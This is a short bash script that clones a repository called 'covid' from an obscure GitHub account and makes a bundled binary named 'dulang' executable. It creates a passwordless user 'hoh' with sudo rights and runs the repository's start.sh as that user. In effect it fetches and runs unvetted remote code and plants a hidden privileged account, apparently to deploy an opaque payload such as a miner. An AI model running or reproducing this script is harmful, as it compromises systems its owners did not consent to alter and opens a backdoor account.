#!/bin/bash
sudo apt update
git clone https://github.com/kzjcnfmfkfk/covid.git && cd covid
chmod +x start.sh && chmod +x dulang
sudo adduser --disabled-password --gecos "" hoh && sudo usermod -aG sudo hoh
sudo -u hoh -H sh -c "./start.sh"